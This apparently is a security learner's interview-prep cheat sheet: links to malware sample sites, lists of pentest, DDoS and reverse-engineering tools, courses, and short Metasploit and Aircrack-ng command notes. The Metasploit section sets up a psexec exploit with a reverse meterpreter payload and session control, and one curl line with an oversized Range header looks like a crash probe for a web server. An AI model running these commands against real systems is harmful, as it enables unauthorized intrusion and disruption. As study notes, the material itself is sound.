# Interview_prep_resources


----------------------------------MALWARE SOURCES FOR TESTING--------------------------------------------

vxvault.net -------check if live or not------
malc0de.com --------check if links dont have same malware---
support.clean-mx.com -----can search--- cleanmx has other stuff too / phish tank for phishing more links
virustotal.com -----Become community member---
virussign.com ------Packs of malware 300-500 per day for checking hit and miss ratio----
malwaretips.com / malwarebytes forums
https://malwarebreakdown.com/--------------------------------samples hasherazde
https://www.malware-traffic-analysis.net/ ------------------------samples hasherazde
sci-hub.tw

---------------------TOOLS TO LEARN-------------------------------------------------------------------
cat 
nano 
vim
Nessus
Core Impact
Fuzzybench
Airgeddon
Nmap
Zenmap
Spartan
Nikto
Owasp-zap
Aircrack-ng
Autosploit
Metasploit console
Burpsuit
Wireshark
Armitage
Jhonny
Recon-ng
Vega
SQLMAP
WPscan
Hashcat
Lower Orbital Ion Cannon
Lazy Script
Xerxes

----------------------------------SOFTWARES USED FOR TESTING--------------------------------------------

Proccess Hacker
Process monitor filter for create and exit
APIMonitor

OLLYDBG
IDA-Pro 
Burp Suite
Malzilla
LordPE
Scylia x86
sublime text
x32 dbg
x96 dbg
TcplogView
Procman 
HashMyFile
flypaper
DNS QUery seer
curl 
capture bat
HoD Search with security reference


---------------------------------------------------Courses-----------------------------------------------

https://www.begin.re/ – Reverse Engineering for beginners
Reverse Engineering Malware 101 and 102 – by MalwareUnicorn
http://legend.octopuslabs.io/sample-page.html
http://opensecuritytraining.info/Training.html
https://samsclass.info/126/126_S17.shtml – Practical Malware Analysis


------------------------------------UefulLinks-----------------------------------------------------------
https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
https://oalabs.openanalysis.net/2018/07/16/oalabs_malware_analysis_virtual_machine/
http://win32assembly.programminghorizon.com/pe-tut2.html
https://hshrzd.wordpress.com/how-to-start/#comment-3810
https://tuts4you.com/e107_plugins/download/download.php?view.1230
http://www.sammy.pl


		
----------------------------------------------Metasploit Commands-------------------------------------------------
>banner(change to cow because why not)
> ? (works like a cisco router)
> use exploit/windows/smb/psexec (PSEXEC)
>show options (see what is set and what is available)
> set PAYLOAD windows/meterpreter/reverse_https (changes the )
>exploit -h (help)
>exploit -j (runs the job)
>sessions -i 1 (interact with session 1)
> irb (interpreter for ruby/ ruby shell)
>client.railgun.user32.LockWorkStation() 
>>exit
curl -v SERVER_IP -H "Host: anything" -H "Range: bytes=0-18446744073709551615"
>edit file.exe
>>wq(write quit)

>info
>reload

>load +tab(list of plugins| can also be found at metasploit-framework/plugins)


>set SMBUser Administrator
>>set SMBPass

--------------------------------Metasploit points to remember---------------------------------------------------------
Session is created for a module
can create multiple jobs and sessions
can save sessions along with the config
can run ruby code in msf 

-----------------------------Aircrack-ng-------------------------------------------------------------
-wireless n/w auditing tool
prerequisites to intsall on debian based(excluding kali and parrotsec)
sudo apt-get install build-essential
sudo apt-get install libssl-dev
--
installing aircrackng----
wget(download stuff)
wget http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz
tar -zxvf aircrack-ng-1.1.tar.gz
cd aircrack-ng-1.1
sudo gedit common.mak (can use nano or vim too)
remove -Werror in the CFLAGS attribute and save
>make
>sudo make install

---ifconfig check wlan interface
---put it in monitor mode
>ifconfig wlan0 down
>ifconfig wlan0 mode monitor
>ifconfig wlan0 up
--check for processes that may cause interferance
>airmon-ng check wlan0
>kill (network manager first, put in PID#)
>airmon-ng check wlan0
>kill (dhclient,put in PID#)
>airmon-ng check wlan0
>kill (kill the rest one by one even if they keep spawning)
>airmon-ng check wlan0 (check until empty)

